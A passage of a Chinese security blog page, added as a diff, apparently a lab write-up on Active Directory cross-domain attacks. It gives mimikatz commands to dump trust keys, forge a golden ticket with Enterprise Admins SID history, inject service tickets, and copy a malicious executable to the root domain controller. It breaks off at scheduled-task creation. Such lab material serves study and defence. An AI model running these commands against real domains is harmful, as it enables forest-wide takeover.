@@ -1,0 +1,1191 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="r1">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="跨域攻击1.跨域攻击介绍内网中的域林很多大型企业都拥有自己的内网，一般通过域林进行共享资源。根据不同职能区分的部门，从逻辑上以 主域和子域进行区分，以方便统一管理。在物理层，通常使用防火墙将各个子公司及各个部门划分为不 同的区域。    跨域攻击方法1、常规渗透方法（利用web漏洞）  2、哈希传递票据攻击  3、利用域信任关系   域信任关系建立域之间的信任关系，是为了一个域的用户能方便地访问其">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网-跨域攻击">
+<meta property="og:url" content="http://example.com/2023/11/03/%E5%86%85%E7%BD%91-%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="r1ckyL&#39;s secret">
+<meta property="og:description" content="跨域攻击1.跨域攻击介绍内网中的域林很多大型企业都拥有自己的内网，一般通过域林进行共享资源。根据不同职能区分的部门，从逻辑上以 主域和子域进行区分，以方便统一管理。在物理层，通常使用防火墙将各个子公司及各个部门划分为不 同的区域。    跨域攻击方法1、常规渗透方法（利用web漏洞）  2、哈希传递票据攻击  3、利用域信任关系   域信任关系建立域之间的信任关系，是为了一个域的用户能方便地访问其">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/image-20231025205850053.png">
+<meta property="og:image" content="http://example.com/img/image-20231025210016134.png">
+<meta property="og:image" content="http://example.com/img/image-20231025210443394.png">
+<meta property="og:image" content="http://example.com/img/image-20231026094725086.png">
+<meta property="og:image" content="http://example.com/img/image-20231026094835010.png">
+<meta property="og:image" content="http://example.com/img/image-20231026095136670.png">
+<meta property="og:image" content="http://example.com/img/image-20231026095455432.png">
+<meta property="og:image" content="http://example.com/img/image-20231026095639902.png">
+<meta property="og:image" content="http://example.com/img/image-20231026095922864.png">
+<meta property="og:image" content="http://example.com/img/image-20231026102839696.png">
+<meta property="og:image" content="http://example.com/img/image-20231026103215208.png">
+<meta property="og:image" content="http://example.com/img/image-20231026103430931.png">
+<meta property="og:image" content="http://example.com/img/image-20231026103438997.png">
+<meta property="og:image" content="http://example.com/img/image-20231026103445557.png">
+<meta property="og:image" content="http://example.com/img/image-20231026103455152.png">
+<meta property="og:image" content="http://example.com/img/image-20231026104233107.png">
+<meta property="og:image" content="http://example.com/img/image-20231026105125823.png">
+<meta property="og:image" content="http://example.com/img/image-20231026105148997.png">
+<meta property="og:image" content="http://example.com/img/image-20231026105326339.png">
+<meta property="og:image" content="http://example.com/img/image-20231026105529361.png">
+<meta property="og:image" content="http://example.com/img/image-20231026105708237.png">
+<meta property="og:image" content="http://example.com/img/image-20231026110944699.png">
+<meta property="og:image" content="http://example.com/img/image-20231026111429382.png">
+<meta property="og:image" content="http://example.com/img/image-20231026111503517.png">
+<meta property="og:image" content="http://example.com/img/image-20231026111829628.png">
+<meta property="og:image" content="http://example.com/img/image-20231026111902847.png">
+<meta property="og:image" content="http://example.com/img/image-20231026113125073.png">
+<meta property="og:image" content="http://example.com/img/image-20231026113203073.png">
+<meta property="og:image" content="http://example.com/img/image-20231026113720225.png">
+<meta property="og:image" content="http://example.com/img/image-20231026113818554.png">
+<meta property="og:image" content="http://example.com/img/image-20231026113825582.png">
+<meta property="og:image" content="http://example.com/img/image-20231026113911603.png">
+<meta property="og:image" content="http://example.com/img/image-20231026113932373.png">
+<meta property="og:image" content="http://example.com/img/image-20231026114021660.png">
+<meta property="og:image" content="http://example.com/img/image-20231026114044469.png">
+<meta property="og:image" content="http://example.com/img/image-20231026114118756.png">
+<meta property="og:image" content="http://example.com/img/image-20231026114218620.png">
+<meta property="og:image" content="http://example.com/img/image-20231026114459649.png">
+<meta property="og:image" content="http://example.com/img/image-20231026114535439.png">
+<meta property="og:image" content="http://example.com/img/image-20231026114559758.png">
+<meta property="og:image" content="http://example.com/img/image-20231026142607004.png">
+<meta property="og:image" content="http://example.com/img/image-20231026142645127.png">
+<meta property="og:image" content="http://example.com/img/image-20231026143120911.png">
+<meta property="og:image" content="http://example.com/img/image-20231026143132818.png">
+<meta property="og:image" content="http://example.com/img/image-20231026143603868.png">
+<meta property="og:image" content="http://example.com/img/image-20231026143634354.png">
+<meta property="og:image" content="http://example.com/img/image-20231026144321857.png">
+<meta property="og:image" content="http://example.com/img/image-20231026145058584.png">
+<meta property="og:image" content="http://example.com/img/image-20231026145731798.png">
+<meta property="og:image" content="http://example.com/img/image-20231026145744792.png">
+<meta property="og:image" content="http://example.com/img/image-20231026150551796.png">
+<meta property="og:image" content="http://example.com/img/image-20231026150752355.png">
+<meta property="og:image" content="http://example.com/img/image-20231026151227151.png">
+<meta property="og:image" content="http://example.com/img/image-20231026154603409.png">
+<meta property="og:image" content="http://example.com/img/image-20231026154958716.png">
+<meta property="og:image" content="http://example.com/img/image-20231026155119975.png">
+<meta property="og:image" content="http://example.com/img/image-20231026155241351.png">
+<meta property="og:image" content="http://example.com/img/image-20231026155300222.png">
+<meta property="og:image" content="http://example.com/img/image-20231026155537670.png">
+<meta property="og:image" content="http://example.com/img/image-20231026155706178.png">
+<meta property="og:image" content="http://example.com/img/image-20231026155724917.png">
+<meta property="og:image" content="http://example.com/img/image-20231026155917312.png">
+<meta property="og:image" content="http://example.com/img/image-20231026162055410.png">
+<meta property="og:image" content="http://example.com/img/image-20231026162115838.png">
+<meta property="og:image" content="http://example.com/img/image-20231026162234292.png">
+<meta property="og:image" content="http://example.com/img/image-20231026162243719.png">
+<meta property="og:image" content="http://example.com/img/image-20231026162307198.png">
+<meta property="og:image" content="http://example.com/img/image-20231026162327496.png">
+<meta property="og:image" content="http://example.com/img/image-20231026162338329.png">
+<meta property="og:image" content="http://example.com/img/image-20231026165118008.png">
+<meta property="og:image" content="http://example.com/img/image-20231026165502523.png">
+<meta property="og:image" content="http://example.com/img/image-20231026173140970.png">
+<meta property="og:image" content="http://example.com/img/image-20231026173807878.png">
+<meta property="og:image" content="http://example.com/img/image-20231026173852063.png">
+<meta property="og:image" content="http://example.com/img/image-20231026173915464.png">
+<meta property="og:image" content="http://example.com/img/image-20231026173937509.png">
+<meta property="og:image" content="http://example.com/img/image-20231026174002747.png">
+<meta property="og:image" content="http://example.com/img/image-20231026174025033.png">
+<meta property="og:image" content="http://example.com/img/image-20231026174037119.png">
+<meta property="article:published_time" content="2023-11-03T04:18:08.000Z">
+<meta property="article:modified_time" content="2023-11-03T04:25:23.882Z">
+<meta property="article:author" content="r1">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/image-20231025205850053.png">
+  
+  
+  
+  <title>内网-跨域攻击 - r1ckyL&#39;s secret</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"VM6iIPhII9dNKYvDTSfaQlfY-MdYXbMMI","app_key":"ji1dPD8DG5BrS1OfKrqzGDUL","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>r1ckyL</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内网-跨域攻击"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-03 12:18" pubdate>
+          2023年11月3日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          75 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">内网-跨域攻击</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="跨域攻击"><a href="#跨域攻击" class="headerlink" title="跨域攻击"></a>跨域攻击</h1><h2 id="1-跨域攻击介绍"><a href="#1-跨域攻击介绍" class="headerlink" title="1.跨域攻击介绍"></a>1.跨域攻击介绍</h2><h3 id="内网中的域林"><a href="#内网中的域林" class="headerlink" title="内网中的域林"></a>内网中的域林</h3><p>很多大型企业都拥有自己的内网，一般通过域林进行共享资源。根据不同职能区分的部门，从逻辑上以 主域和子域进行区分，以方便统一管理。在物理层，通常使用防火墙将各个子公司及各个部门划分为不 同的区域。</p>
+<img src="/img/image-20231025205850053.png" srcset="/img/loading.gif" lazyload alt="image-20231025205850053" style="zoom: 67%;" /> 
+
+<h3 id="跨域攻击方法"><a href="#跨域攻击方法" class="headerlink" title="跨域攻击方法"></a>跨域攻击方法</h3><p>1、常规渗透方法（利用web漏洞） </p>
+<p>2、哈希传递票据攻击 </p>
+<p>3、利用域信任关系</p>
+<img src="/img/image-20231025210016134.png" srcset="/img/loading.gif" lazyload alt="image-20231025210016134" style="zoom:67%;" />
+
+<h3 id="域信任关系"><a href="#域信任关系" class="headerlink" title="域信任关系"></a>域信任关系</h3><p>建立域之间的信任关系，是为了一个域的用户能方便地访问其他域的资源，同时也方便了对域网络的管 理和维护，域信任作为域中的一种机制，<strong>允许另一个域的用户在通过身份验证后访问本域中的资源</strong>。同 时，域信任利用DNS服务器定位两个不同子域的域控制器，如果两个域中的域控制器都无法找到另一个 域，也就不存在通过域信任关系进行跨域资源共享了</p>
+<h3 id="域信任关系分类"><a href="#域信任关系分类" class="headerlink" title="域信任关系分类"></a>域信任关系分类</h3><p>域信任关系分为单向信任和双向信任 </p>
+<p><strong>单向信任</strong>：是指在两个域之间创建单向的信任路径，即在一个方向上是信任流，在另一个方向上是访问 流，受信任域内的用户（或者计算机）可以访问信任域内的资源，但信任域内的用户无法访问受信任域 内的资源。也就是说，A域信任B域，那么B域内受信任的主体可以访问A域内信任B域的资源。 </p>
+<p><strong>双向信任</strong>：是指两个单向信任的组合，信任域和受信任域彼此信任，在两个方向上都有信任流和访问 流。这意味着，可以从两个方向在两个域之间传递身份验证请求。活动目录中的所有信任关系都是双向 可传递的。在创建子域时，会在新的父域和子域之间自动创建双向可传递信任关系，从下级域发出的身 份验证请求可以通关其父域向上流向信任域</p>
+<p>域信任关系也可以分为内部信任和外部信任</p>
+<p><strong>内部信任</strong>：在默认情况下,<strong>用活动目录安装向导将新域添加到域树或林根域中，会自动创建双向可传递信 任</strong>。在现有林中创建域树时，将建立新的树根信任，当前域树中的两个或多个域之间的信任关系被称为 内部信任。这种信任关系是可传递的。例如，有三个子域BA,CA,DA,BA域信任CA域，CA域信任DA域， 则BA域也信任DA域</p>
+<p>外部信任是指两个不同林中的域的信任关系。外部信任是不可传递的，而且是单向的。</p>
+<p>只有domain admins组中的用户可以管理域信任关系</p>
+<p><img src="/img/image-20231025210443394.png" srcset="/img/loading.gif" lazyload alt="image-20231025210443394"></p>
+<h2 id="2-搭建和查看域信任关系"><a href="#2-搭建和查看域信任关系" class="headerlink" title="2.搭建和查看域信任关系"></a>2.搭建和查看域信任关系</h2><h3 id="搭建域树（内部信任）"><a href="#搭建域树（内部信任）" class="headerlink" title="搭建域树（内部信任）"></a>搭建域树（内部信任）</h3><p>如果是复制的虚拟机请运行 C:\Windows\System32\sysprep\sysprep.exe 重新获取SID</p>
+<p>1、修改计算机名和修改IP地址，DNS指向父域 </p>
+<p><img src="/img/image-20231026094725086.png" srcset="/img/loading.gif" lazyload alt="image-20231026094725086"></p>
+<p><img src="/img/image-20231026094835010.png" srcset="/img/loading.gif" lazyload alt="image-20231026094835010"></p>
+<p>2、安装 AD域服务 </p>
+<p>除了这里全都下一步 最后安装</p>
+<p><img src="/img/image-20231026095136670.png" srcset="/img/loading.gif" lazyload alt="image-20231026095136670"></p>
+<p>3、升级为域控</p>
+<p><img src="/img/image-20231026095455432.png" srcset="/img/loading.gif" lazyload alt="image-20231026095455432"></p>
+<p>4、添加到现有林    点击更改提供父域的账号密码</p>
+<p><img src="/img/image-20231026095639902.png" srcset="/img/loading.gif" lazyload alt="image-20231026095639902"></p>
+<p>5、正常安装直到结束</p>
+<p><img src="/img/image-20231026095922864.png" srcset="/img/loading.gif" lazyload alt="image-20231026095922864"></p>
+<p>6.pc-2008-2（10.210.100.144）加入子域</p>
+<p><img src="/img/image-20231026102839696.png" srcset="/img/loading.gif" lazyload alt="image-20231026102839696"> </p>
+<p><img src="/img/image-20231026103215208.png" srcset="/img/loading.gif" lazyload alt="image-20231026103215208"> </p>
+<h3 id="搭建域森林（外部信任）（未搭建）"><a href="#搭建域森林（外部信任）（未搭建）" class="headerlink" title="搭建域森林（外部信任）（未搭建）"></a>搭建域森林（外部信任）（未搭建）</h3><p>1、修改计算机名和修改IP地址，DNS指向根域</p>
+<p><img src="/img/image-20231026103430931.png" srcset="/img/loading.gif" lazyload alt="image-20231026103430931"> </p>
+<p>2、安装 AD域服务</p>
+<p><img src="/img/image-20231026103438997.png" srcset="/img/loading.gif" lazyload alt="image-20231026103438997"> </p>
+<p>3、升级为域控</p>
+<p><img src="/img/image-20231026103445557.png" srcset="/img/loading.gif" lazyload alt="image-20231026103445557"> </p>
+<p>4、添加到现有林</p>
+<p><img src="/img/image-20231026103455152.png" srcset="/img/loading.gif" lazyload alt="image-20231026103455152"> </p>
+<p>5、正常安装即可</p>
+<h3 id="获取域信息"><a href="#获取域信息" class="headerlink" title="获取域信息"></a>获取域信息</h3><p>在域中，<strong>Enterprise Admins组（出现在林中的根域中）的成员具有对目录林中所有域的完全控制权限</strong>。在默认情况下，该组包含林中所有域控制器上具有Administrators权限的成员</p>
+<p>查看当前域中计算机的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure>
+
+
+
+<p>使用lg工具获取域的相关信息 </p>
+<p>查看域信任关系</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nltest /domain_trusts<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026104233107.png" srcset="/img/loading.gif" lazyload alt="image-20231026104233107"> </p>
+<p>获取当前域中的用户组</p>
+<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">LG.exe 域名\.<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026105125823.png" srcset="/img/loading.gif" lazyload alt="image-20231026105125823"> </p>
+<p><img src="/img/image-20231026105148997.png" srcset="/img/loading.gif" lazyload alt="image-20231026105148997"> </p>
+<p>获取远程机器的本地用户组</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">LG.<span class="hljs-keyword">exe</span> \\计算机名 -<span class="hljs-keyword">lu</span><br>LG.<span class="hljs-keyword">exe</span> \\DC -<span class="hljs-keyword">lu</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026105326339.png" srcset="/img/loading.gif" lazyload alt="image-20231026105326339"> </p>
+<p><img src="/img/image-20231026105529361.png" srcset="/img/loading.gif" lazyload alt="image-20231026105529361"> </p>
+<p>获取远程系统中的用户SID</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">LG.<span class="hljs-keyword">exe</span> \\计算机名 -<span class="hljs-keyword">lu</span> -sidsout<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026105708237.png" srcset="/img/loading.gif" lazyload alt="image-20231026105708237"> </p>
+<h2 id="3-利用域信任密钥获取目标域"><a href="#3-利用域信任密钥获取目标域" class="headerlink" title="3.利用域信任密钥获取目标域"></a>3.利用域信任密钥获取目标域</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><table>
+<thead>
+<tr>
+<th>IP</th>
+<th>所属域</th>
+<th>域中地位</th>
+<th>机器名</th>
+<th>当前登录用户</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>10.210.100.10</td>
+<td>hack.com</td>
+<td>根域的域控</td>
+<td>DC</td>
+<td>hack\administrator</td>
+</tr>
+<tr>
+<td>10.210.100.150</td>
+<td>abc.hack.com</td>
+<td>子域域控</td>
+<td>DC2</td>
+<td>abc\administrator</td>
+</tr>
+<tr>
+<td>10.210.100.144</td>
+<td>abc.hack.com</td>
+<td>子域中的机器</td>
+<td>PC-2008-2</td>
+<td>abc\liwei</td>
+</tr>
+</tbody></table>
+<p>当前已经控制abc.hack.com域，其中包括 DC2机器和PC-2008-2机器</p>
+<p><img src="/img/image-20231026110944699.png" srcset="/img/loading.gif" lazyload alt="image-20231026110944699"> </p>
+<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>1.发现有根域</p>
+<p><img src="/img/image-20231026111429382.png" srcset="/img/loading.gif" lazyload alt="image-20231026111429382"></p>
+<p>2.当前无法访问DC.HACK.COM</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\dc.hack.com\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026111503517.png" srcset="/img/loading.gif" lazyload alt="image-20231026111503517"> </p>
+<p>3.使用mimikatz获取 <strong>当前域的 SID, 父域的 SID ,子域域管的NTLM ,信任密钥</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;lsadump::lsa /patch /user:HACK$&quot;</span> <span class="hljs-string">&quot;lsadump::trust /patch&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026111829628.png" srcset="/img/loading.gif" lazyload alt="image-20231026111829628"></p>
+<p><img src="/img/image-20231026111902847.png" srcset="/img/loading.gif" lazyload alt="image-20231026111902847"> </p>
+<p>子域sid：S-1-5-21-3991110149-857536787-685120577</p>
+<p>父域sid：S-1-5-21-2431442348-1717482385-2017137259</p>
+<p>信任密钥：8c5948ade6a77b4276a8710327ce83f3</p>
+<p>4.在普通的域内用户中创建创建高权限票据</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /domain:子域 /sid:子域SID /sids:父域sid-519 /rc4:信任密钥 /user:任意用户 /service:krbtgt /target:父域 /ticket:subdc_administrator.kirbi&quot;</span> <span class="hljs-keyword">exit</span><br>eg:kerberos::golden <span class="hljs-regexp">/domain:abc.hack.com /</span>sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3991110149</span>-<span class="hljs-number">857536787</span>-<span class="hljs-number">685120577</span> <span class="hljs-regexp">/sids:S-1-5-21-2431442348-1717482385-2017137259-519 /</span>rc4:<span class="hljs-number">8</span>c5948ade6a77b4276a8710327ce83f3 <span class="hljs-regexp">/user:administrator /</span>service:krbtgt <span class="hljs-regexp">/target:hack.com /</span>ticket:administrator.kirbi<br><br>mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /domain:abc.hack.com /sid:S-1-5-21-2902250016-280749999-3752131090 /sids:S-1-5-21-2716900768-72748719-3475352185-519 /rc4:4101a9a4410052f42a70990e5371a5b9 /user:administrator /service:krbtgt /target:hack.com /ticket:administrator.kirbi&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026113125073.png" srcset="/img/loading.gif" lazyload alt="image-20231026113125073"></p>
+<p><img src="/img/image-20231026113203073.png" srcset="/img/loading.gif" lazyload alt="image-20231026113203073"> </p>
+<p>5.上传asktgs.exe和kirbikator.exe工具，asktgs.exe伪造票据，kirbikator.exe注入票据</p>
+<p><img src="/img/image-20231026113720225.png" srcset="/img/loading.gif" lazyload alt="image-20231026113720225"> </p>
+<p>6.创建CIFS服务的票据进行复制文件的操作</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">shell asktgs<span class="hljs-selector-class">.exe</span> administrator<span class="hljs-selector-class">.kirbi</span> CIFS/DC<span class="hljs-selector-class">.hack</span>.com<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026113818554.png" srcset="/img/loading.gif" lazyload alt="image-20231026113818554"> </p>
+<p><img src="/img/image-20231026113825582.png" srcset="/img/loading.gif" lazyload alt="image-20231026113825582"> </p>
+<p>7.将票据注入内存</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">shell kirbikator<span class="hljs-selector-class">.exe</span> lsa CIFS<span class="hljs-selector-class">.DC</span><span class="hljs-selector-class">.hack</span><span class="hljs-selector-class">.com</span>.kirbi<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026113911603.png" srcset="/img/loading.gif" lazyload alt="image-20231026113911603"> </p>
+<p>8.访问域控</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">dir</span> \\dc.hack.com\c$</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026113932373.png" srcset="/img/loading.gif" lazyload alt="image-20231026113932373"> </p>
+<p>9.复制恶意文件,如果复制失败，请注入host服务票据。</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">shell</span> <span class="hljs-keyword">copy</span> artifact.<span class="hljs-keyword">exe</span> \\dc.hack.<span class="hljs-keyword">com</span>\<span class="hljs-keyword">c</span>$<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026114021660.png" srcset="/img/loading.gif" lazyload alt="image-20231026114021660"> </p>
+<p>10.伪造host服务，进行创建计划任务</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">shell asktgs<span class="hljs-selector-class">.exe</span> administrator<span class="hljs-selector-class">.kirbi</span> host/DC<span class="hljs-selector-class">.hack</span>.com<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026114044469.png" srcset="/img/loading.gif" lazyload alt="image-20231026114044469"> </p>
+<p>11.注入内存</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">shell kirbikator<span class="hljs-selector-class">.exe</span> lsa host<span class="hljs-selector-class">.DC</span><span class="hljs-selector-class">.hack</span><span class="hljs-selector-class">.com</span>.kirbi<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026114118756.png" srcset="/img/loading.gif" lazyload alt="image-20231026114118756"> </p>
+<p>12.重新复制</p>
+<p><img src="/img/image-20231026114218620.png" srcset="/img/loading.gif" lazyload alt="image-20231026114218620"> </p>
+<p>13.创建计划任务(需要重新注入host票据)</p>
